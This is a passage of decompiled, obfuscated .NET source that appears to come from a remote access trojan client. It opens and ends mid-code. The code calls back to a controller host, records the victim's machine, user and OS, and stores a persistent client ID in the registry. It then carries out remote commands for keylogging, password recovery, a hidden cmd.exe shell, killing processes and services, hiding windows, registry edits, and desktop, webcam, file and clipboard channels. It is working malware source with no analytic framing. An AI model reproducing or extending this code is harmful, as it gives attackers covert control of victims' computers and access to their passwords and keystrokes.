					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					GmhWc9n87GxDM122(1);
					try
					{
						streamWriter_3.WriteLine("/KEYSLOGG/");
						streamWriter_3.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void UyxcuYJHWRiEd205()
	{
		string text = null;
		try
		{
			while (Ax2Z9YyHX0128.Connected)
			{
				text = kLAXz7JQSa131.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PSWRECOV/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(y3zXpSaSavKIT143);
						thread.Start(PNOFofAwVi130);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					GmhWc9n87GxDM122(1);
					try
					{
						h1uKoASIWy160.WriteLine("/TRYPAAAA/");
						h1uKoASIWy160.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void method_14()
	{
		string text = null;
		try
		{
			while (GismeNInAT133.Connected)
			{
				text = KsFUC2idJL136.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/LISTPROC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(dHGIOQb8GQEsw161);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/KILLPROC/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(method_10);
						thread2.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					GmhWc9n87GxDM122(1);
					try
					{
						Eew8M9Oujs135.WriteLine("/LISTPROC/");
						Eew8M9Oujs135.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void Ju08fsT0xE9GW207()
	{
		string text = null;
		try
		{
			while (A4l5msLkA5138.Connected)
			{
				text = fvOjRF7zya141.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/LISTSERV/":
					try
					{
						Thread thread6 = new Thread(OQbzvebrvMhrk162);
						thread6.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread5 = new Thread(y4a1xHjbpG3Wn172);
						thread5.Start(text + "¦STOP");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread4 = new Thread(y4a1xHjbpG3Wn172);
						thread4.Start(text + "¦START");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DSBLSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(y4a1xHjbpG3Wn172);
						thread3.Start(text + "¦DISABLE");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MNULSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(y4a1xHjbpG3Wn172);
						thread2.Start(text + "¦MANUAL");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/AUTOSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(y4a1xHjbpG3Wn172);
						thread.Start(text + "¦AUTO");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					GmhWc9n87GxDM122(1);
					try
					{
						streamWriter_4.WriteLine("/LISTSERV/");
						streamWriter_4.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void mb32cxoqJvDeA208()
	{
		string text = null;
		try
		{
			while (J2f1UtolJ4143.Connected)
			{
				text = ZQItWcfNoo146.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REFRWIND/":
					try
					{
						Thread thread3 = new Thread(O0aot8h27dpXL150);
						thread3.Start();
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLSEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById7 = Process.GetProcessById(Conversions.ToInteger(text));
						processById7.Kill();
						Thread thread2 = new Thread(O0aot8h27dpXL150);
						thread2.Start();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById6 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById6.MainWindowHandle, 0);
						Thread thread = new Thread(O0aot8h27dpXL150);
						thread.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MINIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById5 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById5.MainWindowHandle, 6);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MAXIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById4 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById4.MainWindowHandle, 3);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RSTRWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById3 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById3.MainWindowHandle, 9);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DFLTWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById2 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById2.MainWindowHandle, 10);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById.MainWindowHandle, 4);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					GmhWc9n87GxDM122(1);
					try
					{
						NNjSn6u2cc145.WriteLine("/REFRWIND/");
						NNjSn6u2cc145.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	private void f2oH4wWtfeHOC209()
	{
		string text = null;
		try
		{
			while (KxQl4WImEO148.Connected)
			{
				text = streamReader_3.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REGYVIEW/":
					try
					{
						switch (Strings.Mid(text, 11, Strings.Len(text)))
						{
						case "CU":
						{
							Thread thread6 = new Thread(oQQHVphukFDTu165);
							thread6.Start("CU");
							break;
						}
						case "LM":
						{
							Thread thread6 = new Thread(oQQHVphukFDTu165);
							thread6.Start("LM");
							break;
						}
						case "US":
						{
							Thread thread6 = new Thread(oQQHVphukFDTu165);
							thread6.Start("US");
							break;
						}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWS/":
					try
					{
						string text13 = null;
						string text14 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array5 = null;
						array5 = text.Split(new char[1] { '¥' });
						text14 = array5[0];
						text13 = array5[1];
						switch (text14)
						{
						case "CU":
						{
							Thread thread5 = new Thread(method_7);
							thread5.Start(text14 + text13);
							break;
						}
						case "LM":
						{
							Thread thread5 = new Thread(method_7);
							thread5.Start(text14 + text13);
							break;
						}
						case "US":
						{
							Thread thread5 = new Thread(method_7);
							thread5.Start(text14 + text13);
							break;
						}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWV/":
					try
					{
						string text11 = null;
						string text12 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array4 = null;
						array4 = text.Split(new char[1] { '¥' });
						text12 = array4[0];
						text11 = array4[1];
						switch (text12)
						{
						case "CU":
						{
							Thread thread4 = new Thread(JvPR4bmvKUypv170);
							thread4.Start(text12 + text11);
							break;
						}
						case "LM":
						{
							Thread thread4 = new Thread(JvPR4bmvKUypv170);
							thread4.Start(text12 + text11);
							break;
						}
						case "US":
						{
							Thread thread4 = new Thread(JvPR4bmvKUypv170);
							thread4.Start(text12 + text11);
							break;
						}
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGCREAT/":
					try
					{
						string text8 = null;
						string text9 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array3 = null;
						array3 = text.Split(new char[1] { '¥' });
						text9 = array3[0];
						text8 = array3[1];
						string text10 = array3[2];
						switch (text9)
						{
						case "CU":
						{
							Thread thread3 = new Thread(p8solToFcLKnH167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "LM":
						{
							Thread thread3 = new Thread(p8solToFcLKnH167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "US":
						{
							Thread thread3 = new Thread(p8solToFcLKnH167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGDELET/":
					try
					{
						string text5 = null;
						string text6 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array2 = null;
						array2 = text.Split(new char[1] { '¥' });
						text6 = array2[0];
						text5 = array2[1];
						string text7 = array2[2];
						switch (text6)
						{
						case "CU":
						{
							Thread thread2 = new Thread(method_8);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "LM":
						{
							Thread thread2 = new Thread(method_8);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "US":
						{
							Thread thread2 = new Thread(method_8);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGRENAM/":
					try
					{
						string text2 = null;
						string text3 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array = null;
						array = text.Split(new char[1] { '¥' });
						text3 = array[0];
						text2 = array[1];
						string text4 = array[2];
						switch (text3)
						{
						case "CU":
						{
							Thread thread = new Thread(PNnKPbixZ82Wk169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "LM":
						{
							Thread thread = new Thread(PNnKPbixZ82Wk169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "US":
						{
							Thread thread = new Thread(PNnKPbixZ82Wk169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					GmhWc9n87GxDM122(1);
					try
					{
						dClTc2WPck150.WriteLine("/REGYVIEW/");
						dClTc2WPck150.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void QKcuHE0oDvcah210()
	{
		string text = null;
		try
		{
			while (wtMa67cW81153.Connected)
			{
				text = qDraNDX4Lk156.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/STARTCMD/":
					try
					{
						if (!method_5("cmd"))
						{
							lzzj5DrbsdRIp32 = new Process();
							lzzj5DrbsdRIp32.StartInfo.FileName = "cmd.exe";
							lzzj5DrbsdRIp32.StartInfo.CreateNoWindow = true;
							lzzj5DrbsdRIp32.StartInfo.UseShellExecute = false;
							lzzj5DrbsdRIp32.StartInfo.RedirectStandardOutput = true;
							lzzj5DrbsdRIp32.StartInfo.RedirectStandardInput = true;
							lzzj5DrbsdRIp32.StartInfo.RedirectStandardError = true;
							lzzj5DrbsdRIp32.OutputDataReceived += SKUjUxHIVYDWB131;
							lzzj5DrbsdRIp32.Start();
							lzzj5DrbsdRIp32.BeginOutputReadLine();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPCMD/":
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.ProcessName.StartsWith("cmd"))
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CMDCMDGO/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						p1uddsfDi8lpm33.Append(text);
						p1uddsfDi8lpm33.Append("\r\n");
						lzzj5DrbsdRIp32.StandardInput.WriteLine((object?)p1uddsfDi8lpm33);
						p1uddsfDi8lpm33.Remove(0, p1uddsfDi8lpm33.Length);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void tQA0ZnTEdRCQz211()
	{
		checked
		{
			while (true)
			{
				DzFXXg4YmA4gT15 = 0;
				p1uddsfDi8lpm33 = new StringBuilder();
				Pv0OZhJLXDYOZ28 = new TcpClient();
				int delayInSeconds = method_6(5, 25);
				GmhWc9n87GxDM122(delayInSeconds);
				string text = null;
				string text2 = null;
				try
				{
					if (method_11(string_1))
					{
						text = string_1;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(string_1);
						if (hostAddresses.Length > 1)
						{
							text = hostAddresses[0].ToString();
							try
							{
								if (!method_11(text))
								{
									text = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								text = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (method_11(VXmXSdykmxc3m24))
					{
						text2 = VXmXSdykmxc3m24;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(VXmXSdykmxc3m24);
						if (hostAddresses.Length > 1)
						{
							text2 = hostAddresses[0].ToString();
							try
							{
								if (!method_11(text2))
								{
									text2 = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								text2 = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text2 = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					Pv0OZhJLXDYOZ28.Connect(text, fUlxxUFXhvpLT26);
					inpI9qaswpmnO29 = Pv0OZhJLXDYOZ28.GetStream();
					streamReader_0 = new StreamReader(inpI9qaswpmnO29);
					OwUfdzNu4aWsv30 = new StreamWriter(inpI9qaswpmnO29);
					DzFXXg4YmA4gT15 = 0;
					LBMTY8eeSj177 = text;
					hu6UwOzuBE178 = fUlxxUFXhvpLT26;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					try
					{
						try
						{
							Pv0OZhJLXDYOZ28.Connect(text, int_0);
							inpI9qaswpmnO29 = Pv0OZhJLXDYOZ28.GetStream();
							streamReader_0 = new StreamReader(inpI9qaswpmnO29);
							OwUfdzNu4aWsv30 = new StreamWriter(inpI9qaswpmnO29);
							DzFXXg4YmA4gT15 = 0;
							LBMTY8eeSj177 = text;
							hu6UwOzuBE178 = int_0;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							try
							{
								Pv0OZhJLXDYOZ28.Connect(text2, fUlxxUFXhvpLT26);
								inpI9qaswpmnO29 = Pv0OZhJLXDYOZ28.GetStream();
								streamReader_0 = new StreamReader(inpI9qaswpmnO29);
								OwUfdzNu4aWsv30 = new StreamWriter(inpI9qaswpmnO29);
								DzFXXg4YmA4gT15 = 0;
								LBMTY8eeSj177 = text2;
								hu6UwOzuBE178 = fUlxxUFXhvpLT26;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								try
								{
									Pv0OZhJLXDYOZ28.Connect(text2, int_0);
									inpI9qaswpmnO29 = Pv0OZhJLXDYOZ28.GetStream();
									streamReader_0 = new StreamReader(inpI9qaswpmnO29);
									OwUfdzNu4aWsv30 = new StreamWriter(inpI9qaswpmnO29);
									DzFXXg4YmA4gT15 = 0;
									LBMTY8eeSj177 = text2;
									hu6UwOzuBE178 = int_0;
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									method_4();
									Thread.Sleep(100);
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				GmhWc9n87GxDM122(1);
				try
				{
					string text3 = "Client" + Conversions.ToString(method_6(1, 99999));
					try
					{
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)null, false))
						{
							((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text3, RegistryValueKind.String);
						}
						else
						{
							text3 = Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					if ((Operators.CompareString(text3, (string)null, false) == 0) | (text3.Length < 2))
					{
						text3 = "Client" + Conversions.ToString(method_6(1, 99999));
					}
					StreamWriter owUfdzNu4aWsv = OwUfdzNu4aWsv30;
					string[] array = new string[12]
					{
						"/TRYFIRST/",
						text3,
						"*",
						((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Name(),
						"*",
						Environment.UserName,
						"*",
						((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_OSFullName(),
						"*3.6*",
						null,
						null,
						null
					};
					string[] array2 = array;
					string lpszName = "";
					string lpszVer = "";
					array2[9] = Conversions.ToString(capGetDriverDescriptionA(0, ref lpszName, 0, ref lpszVer, 0));
					array[10] = "*";
					array[11] = yUKeIL104();
					owUfdzNu4aWsv.WriteLine(string.Concat(array));
					OwUfdzNu4aWsv30.Flush();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				while (Pv0OZhJLXDYOZ28.Connected)
				{
					try
					{
						string text4 = streamReader_0.ReadLine();
						switch (Strings.Left(text4, 10))
						{
						case "/TRYTRYDK/":
							cwnijYuqInCBg68 = new TcpClient();
							cwnijYuqInCBg68.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							LgZOJZJe2zxSr69 = cwnijYuqInCBg68.GetStream();
							yJvlQpRpK8NC271 = new StreamReader(LgZOJZJe2zxSr69);
							XlhPz2rTPpQC970 = new StreamWriter(LgZOJZJe2zxSr69);
							zueaWPqR188SN72 = new Thread(m4n3Tu0idoQzu192);
							zueaWPqR188SN72.Start();
							XlhPz2rTPpQC970.WriteLine("/TRYDESKK/");
							XlhPz2rTPpQC970.Flush();
							continue;
						case "/TRYTRYWB/":
							zamWR8cArZJGJ73 = new TcpClient();
							zamWR8cArZJGJ73.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							networkStream_0 = zamWR8cArZJGJ73.GetStream();
							Eps8uuudGpOOV76 = new StreamReader(networkStream_0);
							streamWriter_0 = new StreamWriter(networkStream_0);
							EFh7dHho60iUo77 = new Thread(Sr98SZQrihqrE193);
							EFh7dHho60iUo77.Start();
							streamWriter_0.WriteLine("/TRYWEBBB/");
							streamWriter_0.Flush();
							continue;
						case "/TRYTRYFM/":
							mdHjk0nUPN4ks78 = new TcpClient();
							mdHjk0nUPN4ks78.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							aaekNtIFINLHt79 = mdHjk0nUPN4ks78.GetStream();
							Oq0PRcMKw79Mc81 = new StreamReader(aaekNtIFINLHt79);
							lwTyp9d68gwn480 = new StreamWriter(aaekNtIFINLHt79);
							ObIDpVBQER1ho82 = new Thread(ITaS710XX6UWO194);
							ObIDpVBQER1ho82.Start();
							lwTyp9d68gwn480.WriteLine("/TRYFMMMM/");
							lwTyp9d68gwn480.Flush();
							continue;
						case "/TRYTRYIN/":
							U6m2TIWIFhFTW83 = new TcpClient();
							U6m2TIWIFhFTW83.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							yVIPpJLcl1ovR84 = U6m2TIWIFhFTW83.GetStream();
							rPu9T3KsnG8Pr86 = new StreamReader(yVIPpJLcl1ovR84);
							ALe9zZxthFoud85 = new StreamWriter(yVIPpJLcl1ovR84);
							hvbz5Xw28auvI87 = new Thread(hAq4NXCfM77kg196);
							hvbz5Xw28auvI87.Start();
							ALe9zZxthFoud85.WriteLine("/TRYINFOO/");
							ALe9zZxthFoud85.Flush();
							continue;
						case "/TRYTRYMS/":
							FltgfjkciWIb788 = new TcpClient();
							FltgfjkciWIb788.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							lLod56j8H2hIA89 = FltgfjkciWIb788.GetStream();
							OueYzsnXCLEU591 = new StreamReader(lLod56j8H2hIA89);
							qXajE0DbnoZ6r90 = new StreamWriter(lLod56j8H2hIA89);
							ncAYjbyETn2Zh92 = new Thread(OzwVkeb4SCWmb197);
							ncAYjbyETn2Zh92.Start();
							qXajE0DbnoZ6r90.WriteLine("/TRYMSGGG/");
							qXajE0DbnoZ6r90.Flush();
							continue;
						case "/TRYTRYFN/":
							HxWXmp6EiOTJs93 = new TcpClient();
							HxWXmp6EiOTJs93.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							OkDObwoyCrBo594 = HxWXmp6EiOTJs93.GetStream();
							eOr5nGfRme14b96 = new StreamReader(OkDObwoyCrBo594);
							NxMV7cYiLP0Ep95 = new StreamWriter(OkDObwoyCrBo594);
							vBI56lzhBzRnH97 = new Thread(BW9FICbMKpxSj198);
							vBI56lzhBzRnH97.Start();
							NxMV7cYiLP0Ep95.WriteLine("/TRYFUNNN/");
							NxMV7cYiLP0Ep95.Flush();
							continue;
						case "/TRYTRYIE/":
							HKa3uC9MhA7w498 = new TcpClient();
							HKa3uC9MhA7w498.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							V9eqiLQVGnzGJ99 = HKa3uC9MhA7w498.GetStream();
							oVpe1Ay1pp3bg101 = new StreamReader(V9eqiLQVGnzGJ99);
							F58CezIGYuGjK100 = new StreamWriter(V9eqiLQVGnzGJ99);
							thread_0 = new Thread(Xkyk6nAPZVX7R199);
							thread_0.Start();
							F58CezIGYuGjK100.WriteLine("/TRYIEEEE/");
							F58CezIGYuGjK100.Flush();
							continue;
						case "/TRYTRYCL/":
							xOoWEx7ymU103 = new TcpClient();
							xOoWEx7ymU103.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							wslY7HgG5r104 = xOoWEx7ymU103.GetStream();
							RLzG2KDtKv106 = new StreamReader(wslY7HgG5r104);
							YtbVX76VZs105 = new StreamWriter(wslY7HgG5r104);
							thread_1 = new Thread(jvhpXtHBlF67o200);
							thread_1.Start();
							YtbVX76VZs105.WriteLine("/TRYCLIPP/");
							YtbVX76VZs105.Flush();
							continue;
						case "/TRYTRYRD/":
							Gnzdm4CtZx108 = new TcpClient();
							Gnzdm4CtZx108.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							qbzU2LSEVn109 = Gnzdm4CtZx108.GetStream();
							streamReader_1 = new StreamReader(qbzU2LSEVn109);
							streamWriter_1 = new StreamWriter(qbzU2LSEVn109);
							thread_2 = new Thread(v9u49Z20gRvyw201);
							thread_2.Start();
							streamWriter_1.WriteLine("/TRYRDDDD/");
							streamWriter_1.Flush();
							continue;
						case "/TRYTRYPM/":
							GnFRZTrZP5113 = new TcpClient();
							GnFRZTrZP5113.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							j2MArWvD9y114 = GnFRZTrZP5113.GetStream();
							streamReader_2 = new StreamReader(j2MArWvD9y114);
							ywlXfTiJuv115 = new StreamWriter(j2MArWvD9y114);
							thread_3 = new Thread(yLlC1byRiFvls202);
							thread_3.Start();
							ywlXfTiJuv115.WriteLine("/TRYPMMMM/");
							ywlXfTiJuv115.Flush();
							continue;
						case "/TRYTRYSF/":
							mtF1U92IB5118 = new TcpClient();
							mtF1U92IB5118.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							BIvjWn2zSJ119 = mtF1U92IB5118.GetStream();
							voYl9FgYiy121 = new StreamReader(BIvjWn2zSJ119);
							streamWriter_2 = new StreamWriter(BIvjWn2zSJ119);
							G6bQgkHdhg122 = new Thread(method_13);
							G6bQgkHdhg122.Start();
							streamWriter_2.WriteLine("/TRYSFFFF/");
							streamWriter_2.Flush();
							continue;
						case "/TRYTRYLG/":
							tcpClient_0 = new TcpClient();
							tcpClient_0.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							aVprAcK9ah124 = tcpClient_0.GetStream();
							FMQ18GnWku126 = new StreamReader(aVprAcK9ah124);
							streamWriter_3 = new StreamWriter(aVprAcK9ah124);
							SStKoLGKg3127 = new Thread(Y4Q2ELQrVVfJE204);
							SStKoLGKg3127.Start();
							streamWriter_3.WriteLine("/TRYKEYYY/");
							streamWriter_3.Flush();
							continue;
						case "/TRYTRYPS/":
							Ax2Z9YyHX0128 = new TcpClient();
							Ax2Z9YyHX0128.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							networkStream_1 = Ax2Z9YyHX0128.GetStream();
							kLAXz7JQSa131 = new StreamReader(networkStream_1);
							PNOFofAwVi130 = new StreamWriter(networkStream_1);
							thread_4 = new Thread(UyxcuYJHWRiEd205);
							thread_4.Start();
							PNOFofAwVi130.WriteLine("/TRYPASSS/");
							PNOFofAwVi130.Flush();
							continue;
						case "/TRYTRYPR/":
							GismeNInAT133 = new TcpClient();
							GismeNInAT133.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							n1MFFnlpLL134 = GismeNInAT133.GetStream();
							KsFUC2idJL136 = new StreamReader(n1MFFnlpLL134);
							Eew8M9Oujs135 = new StreamWriter(n1MFFnlpLL134);
							omgYM6TjFZ137 = new Thread(method_14);
							omgYM6TjFZ137.Start();
							Eew8M9Oujs135.WriteLine("/TRYPROCC/");
							Eew8M9Oujs135.Flush();
							continue;
						case "/TRYTRYSE/":
							A4l5msLkA5138 = new TcpClient();
							A4l5msLkA5138.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
							Ye489UmR3D139 = A4l5msLkA5138.GetStream();
